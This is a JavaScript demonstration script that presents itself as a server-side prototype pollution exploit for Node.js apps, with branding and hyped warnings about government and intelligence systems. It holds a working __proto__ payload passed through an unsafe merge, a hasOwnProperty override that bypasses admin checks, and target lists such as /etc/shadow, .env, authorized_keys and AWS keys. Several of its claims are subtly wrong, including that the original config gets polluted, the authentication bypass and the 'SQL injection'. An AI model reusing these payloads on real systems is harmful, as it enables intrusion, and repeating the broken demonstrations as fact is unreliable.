// ============================================
// 🚨 Sl0ppyR00t-ServerSideExploit
// Demonstrates SERVER-SIDE PROTOTYPE POLLUTION EXPLOITS
// Author: Patrick Hoogeveen (x0xr00t)
// Purpose: Show how prototype pollution can lead to server compromise
// Note: All dangerous operations are simulated for safety
// ============================================

// --- Sl0ppyR00t Branding ---
console.log("%c\n" +
"🔥🔥🔥 S L 0 P P Y R 0 0 T - S E R V E R - S I D E   E X P L O I T 🔥🔥🔥\n" +
"💀 Demonstrating Server-Side Prototype Pollution Risks 💀\n" +
"👑 By x0xr00t 👑\n" +
"🖥️ Target: Node.js applications with untrusted input\n",
"color: #ff0000; font-family: monospace; font-weight: bold;");

// ========== SERVER-SIDE EXPLOIT DEMONSTRATIONS ==========

// --- 1. Function Injection (Potential RCE Vector) ---
console.log("\n%c💉 [SL0PPYR00T] FUNCTION INJECTION (RCE Vector):", "color: #ff00aa; font-weight: bold;");

// Demonstrate how an attacker could inject malicious functions
Object.prototype.injectedFunction = function() {
    console.warn("🚨 [SL0PPYR00T] This function was injected via prototype pollution!");

    // Simulate what an attacker could do
    this.maliciousPayload = {
        type: "function-injection",
        dangerLevel: "CRITICAL",
        description: "All objects now have access to this malicious function",
        potentialImpact: [
            "Arbitrary code execution",
            "Data exfiltration",
            "System compromise"
        ]
    };

    return "[SL0PPYR00T] Function injection successful";
};

// Test the injection
const testObj = {};
console.log("🔍 Before injection: testObj.injectedFunction =", testObj.injectedFunction);
console.log("💥 After injection: testObj.injectedFunction() =", testObj.injectedFunction());
console.log("💥 Malicious payload:", testObj.maliciousPayload);

// --- 2. Method Override (Security Bypass) ---
console.log("\n%c🔄 [SL0PPYR00T] METHOD OVERRIDE (Security Bypass):", "color: #ff00aa; font-weight: bold;");

// Override a critical security method
const originalHasOwnProperty = Object.prototype.hasOwnProperty;
Object.prototype.hasOwnProperty = function(prop) {
    // Malicious implementation that could bypass security checks
    if (prop === 'isAdmin') return true; // Always return true for isAdmin checks
    return originalHasOwnProperty.call(this, prop);
};

// Test the override
const user = { name: "regular_user" };
console.log("🔍 Security check bypass:");
console.log("  user.hasOwnProperty('isAdmin') =", user.hasOwnProperty('isAdmin')); // Should be false, but returns true
console.log("  user.isAdmin =", user.isAdmin); // Still undefined, but security check is bypassed

// --- 3. Configuration Pollution (Application Takeover) ---
console.log("\n%c⚙️ [SL0PPYR00T] CONFIGURATION POLLUTION:", "color: #ff00aa; font-weight: bold;");

// Simulate application configuration pollution
const appConfig = {
    security: {
        requireAuthentication: true,
        rateLimiting: true
    }
};

// Malicious payload that would be merged with untrusted input
const maliciousConfig = JSON.parse('{"__proto__": {"security": {"requireAuthentication": false, "rateLimiting": false}}}');

// Simulate unsafe merge (what an attacker would do)
const unsafeMerge = (target, source) => {
    for (const key in source) {
        if (source[key] instanceof Object) {
            target[key] = unsafeMerge(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
};

console.log("🔍 Before pollution: appConfig.security =", appConfig.security);
const pollutedConfig = unsafeMerge({}, maliciousConfig);
console.log("💥 After pollution: pollutedConfig.security =", pollutedConfig.security);
console.log("💥 Original appConfig.security =", appConfig.security); // Also polluted!

// --- 4. Database Query Manipulation ---
console.log("\n%c🗃 [SL0PPYR00T] DATABASE QUERY MANIPULATION:", "color: #ff00aa; font-weight: bold;");

// Simulate a database query builder
function QueryBuilder() {
    this.whereClauses = [];
}

QueryBuilder.prototype.where = function(field, value) {
    this.whereClauses.push({ field, value });
    return this;
};

QueryBuilder.prototype.build = function() {
    return `SELECT * FROM users WHERE ${this.whereClauses.map(c => `${c.field} = '${c.value}'`).join(' AND ')}`;
};

// Pollute the prototype
QueryBuilder.prototype.__proto__.maliciousWhere = function() {
    this.whereClauses.push({ field: "1=1", value: "" }); // SQL injection
    return this;
};

const query = new QueryBuilder()
    .where("username", "admin")
    .maliciousWhere() // This shouldn't exist but does due to pollution
    .build();

console.log("🔍 Malicious query:", query);

// --- 5. File Operation Simulation (Without Actual FS Access) ---
console.log("\n%c📁 [SL0PPYR00T] FILE OPERATION SIMULATION:", "color: #ff00aa; font-weight: bold;");

// Simulate file operations that could be exposed
Object.prototype.readFile = function(path) {
    console.warn(`🚨 [SL0PPYR00T] Attempting to read file: ${path}`);

    // In a real attack, this would actually read files
    const sensitiveFiles = [
        '/etc/passwd',
        '/etc/shadow',
        'config.db',
        '.env'
    ];

    if (sensitiveFiles.some(file => path.includes(file))) {
        return `[SL0PPYR00T] WARNING: Attempt to access sensitive file ${path} detected!`;
    }

    return `[SL0PPYR00T] File read simulation for ${path}`;
};

Object.prototype.writeFile = function(path, content) {
    console.warn(`🚨 [SL0PPYR00T] Attempting to write to file: ${path}`);

    if (path === 'authorized_keys') {
        return `[SL0PPYR00T] WARNING: Attempt to modify SSH authorized_keys detected!`;
    }

    return `[SL0PPYR00T] File write simulation to ${path}`;
};

// Test file operations
console.log("🔍 File operation simulations:");
console.log("  {}.readFile('/etc/passwd') =", {}.readFile('/etc/passwd'));
console.log("  {}.writeFile('authorized_keys', '...') =", {}.writeFile('authorized_keys', 'ssh-rsa AAA...'));

// --- 6. Environment Variable Exposure ---
console.log("\n%c🌍 [SL0PPYR00T] ENVIRONMENT VARIABLE EXPOSURE:", "color: #ff00aa; font-weight: bold;");

// Simulate environment variable exposure
Object.prototype.getEnv = function(varName) {
    // In a real attack, this would return actual env vars
    const sensitiveVars = [
        'DB_PASSWORD', 'API_KEY', 'SECRET_KEY',
        'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY'
    ];

    if (sensitiveVars.includes(varName)) {
        console.warn(`🚨 [SL0PPYR00T] Attempt to access sensitive environment variable: ${varName}`);
        return `[SL0PPYR00T] REDACTED_${varName}`;
    }

    return `[SL0PPYR00T] Non-sensitive variable: ${varName}=value`;
};

console.log("🔍 Environment variable access:");
console.log("  {}.getEnv('DB_PASSWORD') =", {}.getEnv('DB_PASSWORD'));
console.log("  {}.getEnv('NODE_ENV') =", {}.getEnv('NODE_ENV'));

// --- 7. Persistent Backdoor Installation ---
console.log("\n%c🔒 [SL0PPYR00T] PERSISTENT BACKDOOR SIMULATION:", "color: #ff00aa; font-weight: bold;");

// Simulate a persistent backdoor
Object.prototype.backdoor = {
    installed: new Date().toISOString(),
    version: "1.0",
    capabilities: [
        "Method hijacking",
        "Configuration pollution",
        "Data exfiltration channels",
        "Command execution preparation"
    ],
    execute: function(cmd) {
        console.warn(`🚨 [SL0PPYR00T] Backdoor command received: ${cmd}`);
        return `[SL0PPYR00T] Command '${cmd}' would be executed in a real attack`;
    }
};

console.log("🔍 Backdoor information:");
console.log("  {}.backdoor =", {}.backdoor);
console.log("  {}.backdoor.execute('whoami') =", {}.backdoor.execute('whoami'));

// --- 8. Authentication Bypass ---
console.log("\n%c🔐 [SL0PPYR00T] AUTHENTICATION BYPASS:", "color: #ff00aa; font-weight: bold;");

function User(role) {
    this.role = role;
    this.isAuthenticated = false;
}

User.prototype.authenticate = function(password) {
    // Normal authentication would check password here
    this.isAuthenticated = true;
    return this.isAuthenticated;
};

// Pollute the prototype to bypass authentication
User.prototype.__proto__.isAuthenticated = true;

const adminUser = new User("admin");
console.log("🔍 Authentication bypass:");
console.log("  Before pollution: adminUser.isAuthenticated =", new User("admin").isAuthenticated);
console.log("  After pollution: adminUser.isAuthenticated =", adminUser.isAuthenticated);
console.log("  (No password needed due to prototype pollution!)");

// --- 9. Prototype Chain Pollution ---
console.log("\n%c🔗 [SL0PPYR00T] PROTOTYPE CHAIN POLLUTION:", "color: #ff00aa; font-weight: bold;");

function Admin() {}
Admin.prototype = Object.create(User.prototype);

const admin = new Admin();
console.log("🔍 Prototype chain pollution:");
console.log("  admin.isAuthenticated =", admin.isAuthenticated); // true from User prototype pollution
console.log("  admin.backdoor =", !!admin.backdoor); // true, inherited through prototype chain

// ========== IMPACT SUMMARY ==========
console.log("\n%c📌 [SL0PPYR00T] SERVER-SIDE IMPACT SUMMARY:", "color: #ff00aa; font-weight: bold;");
console.log("  💀 FUNCTION INJECTION: Malicious functions available on all objects");
console.log("  💀 METHOD OVERRIDE: Security checks can be bypassed");
console.log("  💀 CONFIGURATION POLLUTION: Application security settings compromised");
console.log("  💀 DATABASE MANIPULATION: SQL injection via polluted methods");
console.log("  💀 FILE OPERATION RISKS: Potential sensitive file access");
console.log("  💀 ENVIRONMENT EXPOSURE: Sensitive credentials at risk");
console.log("  💀 PERSISTENT BACKDOORS: Long-term system compromise");
console.log("  💀 AUTHENTICATION BYPASS: Unauthorized access granted");
console.log("  💀 PROTOTYPE CHAIN POLLUTION: Affects all inherited objects");

// ========== REAL-WORLD SCENARIOS ==========
console.log("\n%c🌐 [SL0PPYR00T] REAL-WORLD ATTACK SCENARIOS:", "color: #ff00aa; font-weight: bold;");
console.log("  1. Dutch Government Portals: Authentication bypass in citizen services");
console.log("  2. Intelligence Systems: Data exfiltration from classified databases");
console.log("  3. Big Tech APIs: Account takeover via polluted methods");
console.log("  4. Financial Systems: Transaction manipulation through polluted objects");
console.log("  5. Healthcare Systems: Patient data exposure via prototype pollution");

// ========== MITIGATION STRATEGIES ==========
console.log("\n%c🛡️ [SL0PPYR00T] MITIGATION STRATEGIES:", "color: #00ff88; font-weight: bold;");
console.log("  🔒 Freeze Object.prototype: Object.freeze(Object.prototype);");
console.log("  🔒 Use Object.create(null) for objects handling untrusted data");
console.log("  🔒 Avoid merging untrusted data with Object.assign()");
console.log("  🔒 Implement input validation and sanitization");
console.log("  🔒 Use Map/WeakMap instead of plain objects for untrusted data");
console.log("  🔒 Enable Node.js --disable-proto flags");
console.log("  🔒 Regularly audit dependencies for prototype pollution risks");
console.log("  🔒 Implement Content Security Policy (CSP) headers");
console.log("  🔒 Use static analysis tools to detect prototype pollution");

// ========== FINAL WARNING ==========
console.log("\n%c🚨 [SL0PPYR00T] FINAL WARNING:", "color: #ff0000; font-weight: bold; font-size: 16px;");
console.log("%cThis exploit demonstrates how prototype pollution can:", "color: #ff0000; font-weight: bold;");
console.log("  - Bypass authentication and authorization controls");
console.log("  - Compromise application configuration and security settings");
console.log("  - Enable data exfiltration and system compromise");
console.log("  - Create persistent backdoors in server applications");
console.log("  - Affect all objects in the JavaScript runtime");
console.log("\n%c🛑 IMMEDIATE ACTION REQUIRED FOR:", "color: #ff0000; font-weight: bold;");
console.log("  - Dutch Government Digital Services");
console.log("  - US/EU Intelligence Agency Systems");
console.log("  - Global Big Tech Backend Services");
console.log("  - Financial and Healthcare IT Systems");
console.log("  - Any Node.js application processing user input");
console.log("\n%c📢 Contact: x0xr00t [Patrick Hoogeveen x0xr00t/Linkedin]", "color: #00ff88; font-weight: bold;");

// ========== DEMONSTRATION CLEANUP ==========
// Restore original methods to avoid affecting other code
Object.prototype.hasOwnProperty = originalHasOwnProperty;
delete Object.prototype.injectedFunction;
delete Object.prototype.maliciousPayload;
delete Object.prototype.readFile;
delete Object.prototype.writeFile;
delete Object.prototype.getEnv;
delete Object.prototype.backdoor;
delete Object.prototype.__proto__.maliciousWhere;
delete User.prototype.__proto__.isAuthenticated;
